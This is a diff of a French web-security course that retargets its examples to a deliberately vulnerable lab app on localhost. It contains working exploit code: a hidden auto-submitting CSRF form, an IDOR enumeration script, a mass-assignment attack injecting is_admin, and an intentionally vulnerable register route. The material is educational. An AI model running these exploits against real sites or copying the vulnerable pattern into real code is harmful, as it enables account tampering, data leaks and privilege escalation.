@@ -10,11 +10,11 @@ CSRF exploite la confiance d'un site envers un utilisateur authentifié. Le navi
 
 **Scénario type** :
 ```
-1. Alice est connectée sur banque.com (cookie de session actif)
+1. Alice est connectée sur vulnpyapp.local (cookie de session actif)
 2. Alice visite blog-piege.com (sous contrôle de l'attaquant)
-3. Le blog contient : <img src="https://banque.com/transfer?to=hacker&amount=1000">
-4. Le navigateur fait la requête AVEC le cookie de banque.com
-5. Le transfert est effectué au nom d'Alice
+3. Le blog contient un formulaire POST caché vers /profile/update
+4. Le navigateur soumet automatiquement le formulaire AVEC le cookie d'Alice
+5. Le profil d'Alice est modifié (username, bio) au nom d'Alice
 ```
 
 ### 2.1.2 Exploitation
@@ -36,13 +36,13 @@ def malicious_page():
     <body>
         <h1>🎁 Félicitations ! Cliquez pour réclamer</h1>
 
-        <!-- Attaque CSRF cachée : changement de mot de passe -->
+        <!-- Attaque CSRF cachée : modification du profil de la victime -->
         <form id="csrf-attack"
-              action="http://localhost:5000/account/change-password"
+              action="http://localhost:5000/profile/update"
               method="POST"
               style="display:none">
-            <input name="new_password" value="hacked_by_attacker_2024">
-            <input name="confirm_password" value="hacked_by_attacker_2024">
+            <input name="username" value="pwned-by-csrf">
+            <input name="bio" value="This account was hijacked via CSRF.">
         </form>
 
         <script>
@@ -71,17 +71,17 @@ import requests
 # Simulation : Alice est connectée
 session = requests.Session()
 session.post('http://localhost:5000/login', data={
-    'email': 'alice@app.com',
-    'password': 'AlicePass123'
+    'email': 'alice@vulnpyapp.local',
+    'password': 'Alice123!'
 })
 
 # L'attaquant fait une requête depuis "l'extérieur" avec la session d'Alice
 # (simulant une requête déclenchée par une page malveillante)
 response = session.post(
-    'http://localhost:5000/account/change-password',
+    'http://localhost:5000/profile/update',
     data={
-        'new_password': 'hacked',
-        'confirm_password': 'hacked'
+        'username': 'pwned-by-csrf',
+        'bio': 'This account was hijacked via CSRF.'
     },
     headers={
         # Pas de header Origin/Referer ou un mauvais
@@ -232,11 +232,11 @@ def update_user(user_id):
 # scripts/exploit_idor.py
 import requests
 
-# Connexion en tant qu'utilisateur normal (ID=2)
+# Connexion en tant qu'utilisateur normal (Bob)
 session = requests.Session()
 session.post('http://localhost:5000/login', data={
-    'email': 'bob@app.com',
-    'password': 'BobPass123'
+    'email': 'bob@vulnpyapp.local',
+    'password': 'Bob123!'
 })
 
 print("🔍 Test IDOR sur /api/orders/<id>")
@@ -245,16 +245,17 @@ for order_id in range(1, 20):
     if r.status_code == 200:
         data = r.json()
         # Bob accède à des commandes qui ne sont pas les siennes
-        if data.get('user_id') != 2:
+        if data.get('user_id') != 3:  # Bob = id 3
             print(f"🚨 IDOR : commande {order_id} appartient à user {data['user_id']}")
             print(f"   Données : {data}")
 
-print("\n🔍 Test IDOR sur /api/users/<id> (modification)")
-r = session.put('http://localhost:5000/api/users/1', json={
-    'email': 'hacked@attacker.com'
-})
+print("\n🔍 Test info-disclosure sur /api/users/<id>")
+# L'endpoint GET expose is_admin et email d'autres utilisateurs (vraie vuln)
+r = session.get('http://localhost:5000/api/users/1')  # id 1 = admin
 if r.status_code == 200:
-    print("🚨 IDOR critique : modification du profil admin réussie !")
+    data = r.json()
+    print(f"🚨 Fuite : compte admin exposé → {data}")
+    # → {'id': 1, 'email': 'admin@vulnpyapp.local', 'is_admin': True, ...}
 ```
 
 ### 2.2.4 Protection : vérification d'autorisation
@@ -360,19 +361,18 @@ def get_order(public_id):
 **Principe** : l'application accepte aveuglément tous les champs envoyés par l'utilisateur.
 
 ```python
-# 🚨 VULNÉRABLE
-@app.route('/api/users/<int:user_id>', methods=['PUT'])
-@login_required
-def update_user(user_id):
-    user = User.query.get_or_404(user_id)
-    data = request.get_json()
-
-    # Tous les champs sont mis à jour, y compris is_admin !
-    for key, value in data.items():
-        setattr(user, key, value)
-
-    db.session.commit()
-    return jsonify(user.to_dict())
+# 🚨 VULNÉRABLE - extrait de VulnPyApp app.py
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        # 🚨 VULNÉRABLE : tous les champs du formulaire passent au modèle
+        data = request.form.to_dict()
+        user = User(**{k: v for k, v in data.items() if k != 'password'})
+        user.set_password(data.get('password', ''))
+        db.session.add(user)
+        db.session.commit()
+        login_user(user)
+        return redirect(url_for('profile'))
 ```
 
 **Exploitation** :
@@ -381,21 +381,25 @@ def update_user(user_id):
 # scripts/exploit_mass_assignment.py
 import requests
 
-session = requests.Session()
-session.post('http://localhost:5000/login', data={
-    'email': 'bob@app.com', 'password': 'BobPass123'
+# Création d'un compte avec is_admin=true injecté dans le formulaire
+r = requests.post('http://localhost:5000/register', data={
+    'email': 'evil@attacker.com',
+    'username': 'evil',
+    'password': 'Evil123!',
+    'bio': 'Pwned',
+    'is_admin': 'true',  # 🎯 Champ non prévu mais accepté par User(**data)
 })
 
-# Élévation de privilèges via Mass Assignment
-r = session.put('http://localhost:5000/api/users/2', json={
-    'email': 'bob@app.com',
-    'name': 'Bob',
-    'is_admin': True,       # 🎯 Champ non prévu mais accepté
-    'balance': 999999       # 🎯 Modification de solde
+# Vérification : connexion et accès au panel admin
+s = requests.Session()
+s.post('http://localhost:5000/login', data={
+    'email': 'evil@attacker.com',
+    'password': 'Evil123!'
 })
+admin_page = s.get('http://localhost:5000/admin')
 
-if r.json().get('is_admin'):
-    print("🚨 Élévation de privilèges réussie !")
+if admin_page.status_code == 200:
+    print("🚨 Élévation de privilèges réussie via mass assignment !")
 ```
 
 **Protections** :
@@ -1483,10 +1487,10 @@ class TestAuthenticationSecurity:
         """Protection contre le brute force après N échecs"""
         for i in range(6):
             client.post('/login', data={
-                'email': 'admin@app.com', 'password': 'wrong'
+                'email': 'admin@vulnpyapp.local', 'password': 'wrong'
             })
         r = client.post('/login', data={
-            'email': 'admin@app.com', 'password': 'correct'
+            'email': 'admin@vulnpyapp.local', 'password': 'Admin123!'
         })
         assert 'locked' in r.json.get('error', '').lower()
 
